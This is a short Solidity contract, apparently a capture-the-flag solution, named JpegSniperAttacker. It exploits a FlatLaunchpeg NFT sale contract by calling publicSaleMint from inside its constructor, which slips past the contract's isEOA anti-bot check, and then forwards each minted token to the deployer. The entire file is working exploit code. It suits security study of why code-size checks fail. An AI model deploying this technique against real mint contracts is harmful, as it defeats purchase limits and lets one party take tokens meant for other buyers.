// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.15;

import {FlatLaunchpeg} from "./FlatLaunchpeg.sol";

// We bypass the isEOA modifier by calling the `publicSaleMint` method from the constructor.
contract JpegSniperAttacker {
    constructor(address target, uint256 toMint) {
        FlatLaunchpeg peg = FlatLaunchpeg(target);
        for (uint256 i = 0; i < toMint; i++) {
            uint256 tokenId = peg.totalSupply();
            peg.publicSaleMint{value: peg.salePrice()}(1);
            peg.transferFrom(address(this), msg.sender, tokenId);
        }
    }
}
